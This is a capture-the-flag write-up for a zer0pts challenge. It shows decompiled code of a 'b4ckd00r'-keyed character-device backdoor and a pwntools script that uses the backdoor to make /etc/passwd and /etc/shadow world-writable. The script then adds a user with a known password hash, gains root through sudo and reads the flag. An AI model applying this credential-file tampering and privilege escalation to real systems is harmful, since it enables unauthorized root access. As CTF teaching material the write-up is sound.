The binary creates a CUSE (userspace character device) with a `write` function that allows other files' permissions to be changed. Decompiled code from ghidra:

```C
  str = strndup(data,lenData);
  if (str == (char *)0x0) {
    fuse_reply_err(param_1,0x16);
    goto LAB_00100c8c;
  }
  // partition string by ':'
  keystr = strtok(str,":");
  filestr = strtok((char *)0x0,":");
  modestr = strtok((char *)0x0,":");
  if (((keystr == (char *)0x0) || (filestr == (char *)0x0)) || (modestr == (char *)0x0)) {
    fuse_reply_err(param_1,0x16);
  }
  else {
    // check the key
    iVar1 = strncmp(keystr,"b4ckd00r",8);
    if (iVar1 == 0) {
      // check that the file is a regular file
      stat64(filestr,&local_a8);
      if ((local_a8.st_mode & 0xf000) == 0x8000) {
        // change the file permissions
        __mode = atoi(modestr);
        iVar1 = chmod(filestr,__mode);
        if (iVar1 == 0) {
          fuse_reply_write(param_1,lenData,lenData);
          goto LAB_00100c7d;
        }
      }
      fuse_reply_err(param_1,0x16);
    }
    else {
      fuse_reply_err(param_1,0x16);
    }
  }
LAB_00100c7d:
  free(str);
```

The flag is located in `/root`, however directory permissions can't directly be modified by this backdoor. The user (`1000`)doesn't exist in `/etc/passwd`, so `sudo` doesn't work. The required entry can be added to `/etc/passwd` and a password in `/etc/shadow`, following which `sudo` works:

```python3
from pwn import *
from pow import solve
import re

r = remote("any.ctf.zer0pts.com", 11011)

# solve hash challenge
s = r.recvline().decode().strip()

print(s)
k = solve(*re.search(r'\?([^?"]+).+= (.+)', s).groups(1))
print(k)
r.sendline(k)

# change permissions via the backdoor
def chperm(filename, perm):
    r.sendline(f'echo "b4ckd00r:{filename}:{perm}:aa" > /dev/backdoor')

# set passwd to be modifiable
r.recvuntil("$")
chperm("/etc/passwd", 0o777)
# set shadow to be modifiable
r.recvuntil("$")
chperm("/etc/shadow", 0o777)

# add user
r.recvuntil("$")
r.sendline('echo "somebody:x:1000:1000:/root:/bin/sh" >> /etc/passwd')

# add password "test"
# hash generated with "mkpasswd --method=SHA-512 --stdin"
r.recvuntil("$")
r.sendline("echo 'somebody:$6$D0ieRmN5ytA316be$eDuS3agMCnMdvl6hbsD.yLrjXkrxQPMmM/21xuR91uGKS7G1MmQV7K1BRestbL4C8TW91AZqOX/6CxbqNWKUV1:12::::::' >> /etc/shadow")

# get root
r.recvuntil("$")
r.sendline("sudo -s")
r.recvuntil(":")
r.sendline("test") # password

# print flag
r.recvuntil("#")
r.sendline("cat /root/flag*")
r.recvline()
print(r.recvline().decode().strip())
# zer0pts{exCUSE_m3_bu7_d0_u_m1nd_0p3n1ng_7h3_b4ckd00r?}
```
